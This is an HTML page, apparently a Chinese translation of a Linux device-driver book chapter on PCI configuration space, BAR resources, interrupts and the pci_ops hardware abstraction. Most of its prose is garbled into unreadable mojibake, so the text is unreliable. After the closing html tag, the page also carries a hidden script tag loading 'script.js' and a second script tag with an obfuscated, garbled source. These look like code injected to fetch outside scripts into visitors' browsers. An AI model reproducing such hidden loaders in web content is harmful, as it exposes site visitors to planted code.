<p>ʹ pci_read_ Ѱַñ÷ͨ &lt;linux/pci.h&gt; еķ. , Сȡһ豸İ汾 ID , ͨʹ pci_read_config_bye ʱһ.</p>
<pre class="programlisting">
static unsigned char skel_get_revision(struct pci_dev *dev)
{
 u8 revision;
 pci_read_config_byte(dev, PCI_REVISION_ID, &amp;revision);
 return revision;
}
</pre>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="AccessingtheIOandMemorySpaces.sect2"></a>12.1.9.&#160;ȡ I/O ڴռ</h3></div></div></div>
<p>һ PCI 豸ʵֱ 6  I/O ַ. ÿҪôڴҪô I/O . 󲿷豸ʵǵ I/O Ĵڴ, ΪͨһƵķ(ͬ"	I/O ˿ں I/O ڴ"һн͵, ڵ 9 ). , ڴ, I/O ĴӦ CPU , Ϊÿδȡб߼Ч. Ϊڴʵ I/O Ĵ PCI 豸, ͨһüĴ"ڴԤȡ"λ־ͬ.<sup>[<a name="id471074" href="#ftn.id471074">43</a>]</sup> ڴʶΪԤȡ, CPU ɻݲҶ͵Ż. ǿԤȡڴȡ, һ, ܱŻΪÿδȡб߼Ч,  I/O ˿. ӳǵļĴһڴַΧΧǷǿԤȡ,  PCI ƵڴһЩǿԤȡ. ڱ, ʹô""ָһͨõ I/O  ַռ, ռҪôڴӳ, ҪôǶ˿ӳ.</p>
<p>һӿڰ屨ĴС͵ǰλ, ʹüĴ- 6  32 λĴ, ͼ12-2ʾ, ǵķ PCI_ADDRESS_0  PCI_BASE_ADDRESS_5. Ϊ PCI  I/O ռ 32-λռ, ʹͬýӿڸڴ I/O. 豸ʹ 64-λַ,  64-λڴռ, ʹ 2  PCI_BASE_ADDRESS Ĵÿ, λǰ. һ豸ṩ 32-λ  64-λ.</p>
<p>ں, PCI 豸 I/O ѱɵͨõԴ. ԭ, 㲻شȡñ֪豸ӳ䵽ڴ I/O ռʲôط. ѡϢĽӿڰк:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>unsigned long pci_resource_start(struct pci_dev *dev, int bar);</span></span></dt>
<dd><p>صһַ(ڴַ I/O ˿ں),  6  PCI I/O еһ. ͨ bar (the base address register), Χ 0-5 ().</p></dd>
<dt><span class="term"><span>unsigned long pci_resource_end(struct pci_dev *dev, int bar);</span></span></dt>
<dd><p>һַ, I/O  bar һ. עһõַ, ĵһַ.</p></dd>
<dt><span class="term"><span>unsigned long pci_resource_flags(struct pci_dev *dev, int bar);</span></span></dt>
<dd><p>غԴıʶ.</p></dd>
</dl></div>
<p>Դʶ嵥ԴһЩ. ں PCI I/O  PCIԴ, ϢӻַĴгȡ, ǿط, ûк PCI 豸Դ.</p>
<p>еԴ־ &lt;linux/ioport.h&gt;; Ҫ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>IORESOURCE_IO</span></span></dt>
<dd></dd>
<dt><span class="term"><span>IORESOURCE_MEM </span></span></dt>
<dd><p> I/O , һֻһı־.</p></dd>
<dt><span class="term"><span>IORESOURCE_PREFETCH</span></span></dt>
<dd></dd>
<dt><span class="term"><span>IORESOURCE_READONLY </span></span></dt>
<dd><p>Щ־ǷһڴǿԤȡĲ/д. һ־ PCI ԴӲ.</p></dd>
</dl></div>
<p>ͨʹ pci_resource_ , һ豸ȫԵײ PCI Ĵ, ΪϵͳѾʹԴϢ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="PCIInterrupts.sect2"></a>12.1.10.&#160;PCI ж</h3></div></div></div>
<p>ж, PCI ״.  Linux ʱ, Ĺ̼ѾһΨһжϺŸ豸, ֻҪʹ. жϺű洢üĴ 60 (PCI_INTERRUPT_LINE), һֽڿ.  256 ж, ʵʵʹCPU. طȥжϺ, Ϊ PCI_INTERRUPT_LINE ҵֵ֤ȷһ.</p>
<p>豸֧ж, Ĵ 61 (PCI_INTERRUPT_PIN)  0; , Ƿֵ. , Ϊ֪豸ǷǱж, Ҫ PCI_INTERRUPT_PIN.</p>
<p>, жϵ PCI ضĴҪֽñһֲежϺ, ͬʾ. ֮, ڵ 10 µϢ.</p>
<pre class="programlisting">
result = pci_read_config_byte(dev, PCI_INTERRUPT_LINE, &amp;myirq);
if (result)
{
        /* deal with error */
}
</pre>
<p>ʣµṩ˶ϢĶ, ǶԱд򲻱Ҫ.</p>
<p>һ PCI  4 ж, ʹκһ߶. ÿܽűӵжϿ, жϿɱûκε·ϵ. жϿŸӳж()Ӳ; ƽ̨ĲԱϻƽ̨.</p>
<p>λ PCI_INTERRUPT_PIN ֻüĴ֪ʵʹĸܽ. ֵüסÿ豸жൽ 8 豸; ÿ豸ʹһжϽŲüĴб. ͬһ豸ϵĲͬ豸ʹòͬжϽŻ߹ͬһ.</p>
<p>PCI_INTERRUPT_LINE Ĵ, һ, Ƕ/д. , ̼ɨ PCI 豸Ϊÿ豸üĴ̼жϽӸ PCI λ. ֵɹ̼, Ϊֻй̼֪ӲͬжϽŵ. 豸, ,  PCI_INTERRUPT_LINE Ĵֻ. Ȥ, ڵ Linux ں˰汾ĳЩ¿ɷж,  BIOS.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="HardwareAbstractions.sect2"></a>12.1.11.&#160;Ӳ</h3></div></div></div>
<p>ǽ PCI , ͨٿһϵͳδгϵĶ PCI . ֻһϢԵС, չʾĶ, ں˵ֲչͲ.</p>
<p>ʵӲĻͨİĽṹ. һǿܵļ, ֻСĽһָĿĺÿ.  PCI , ΨһӲصĲǶдüĴЩ, Ϊ PCI ĶֱͨӶд I/O ڴַռ, Щ CPU ֱӿ֮.</p>
<p>, üĴȡصĽṹֻ 2 Ա:</p>
<pre class="programlisting">
struct pci_ops
{
        int (*read)(struct pci_bus *bus, unsigned int devfn, int where, int size, u32 *val);
        int (*write)(struct pci_bus *bus, unsigned int devfn, int where, int size, u32 val);
};
</pre>
<p>ṹ &lt;linux/pci.h&gt; ұ drivers/pci/pci.c ʹ, ﶨʵʵĹ.</p>
<p> PCI ÿռ 2 иĿ, Ƚһָ; ڴ, ʹòָ, ǲпһ, ЩٱвҴӲٶ-ؼ·. pci_read_config_byte(dev, where, val)ʵʵ, , չΪ:</p>
<pre class="programlisting">
dev-&gt;bus-&gt;ops-&gt;read(bus, devfn, where, 8, val); 
</pre>
<p>ϵͳи PCI ϵͳʱ̽, Ҵʱ struct pci_bus Һǵ,  ops ֽ.</p>
<p>ͨ"Ӳ"ݽṹʵӲ Linux ںǵ͵. һҪ struct alpha_machine_vector ݽṹ.  &lt;asm-alpha/machvec.h&gt; ͸κοܵĿ粻ͬ Alpha ļĸı.</p>
</div>
</div>

SBus 
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id469697" href="#id469697">40</a>] </sup>һЩϵҲʾ PCI Ϣ /proc/pci  /proc/bus/pci ļ.</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id469764" href="#id469764">41</a>] </sup>ʵ, Ǹò޶ϵͳʱ; Ȳε豸, , ʱò෴֮. Ҫ豸벻ı I/O ڴĵַ.</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id469852" href="#id469852">42</a>] </sup>㽫豸ԼӲֲ﷢ ID. ļ pci.ids аһб, ļ pciutils ں˴һ; װ, ֻг֪ĹӦ̺豸. ļں˰汾ᱻںϵ. </p></div>
<div class="footnote"><p><sup>[<a name="ftn.id471074" href="#id471074">43</a>] </sup>Ϣλһַ PCI Ĵĵλ. Щλ &lt;linux/pci.h&gt;.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch11s06.html">һҳ</a>&#160;</td>
<td width="20%" align="center">&#160;</td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch12s02.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">11.6.&#160;ٲο&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;12.2.&#160;ع: ISA</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>